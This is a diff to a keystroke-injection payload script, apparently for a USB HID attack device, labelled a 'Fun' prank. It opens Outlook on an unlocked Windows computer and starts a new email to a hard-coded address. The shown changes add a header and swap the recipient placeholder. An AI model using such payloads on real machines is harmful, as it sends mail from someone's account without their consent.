@@ -1,3 +1,11 @@
+#
+#
+# Title:             Unlocked Computer Email
+# Author:            N0m4d1k
+# Category:          Fun
+# Target:.           Windows (Outlook)
+#
+
 ATTACKMODE HID
 Q GUI r
 Q DELAY 500
@@ -6,7 +14,7 @@ Q ENTER
 Q DELAY 800
 Q CTRL n
 Q DELAY 300
-Q STRING "PUT EMAIL HERE"
+Q STRING test@test.com # CHANGE EMAIL
 Q DELAY 500
 Q TAB
 Q TAB
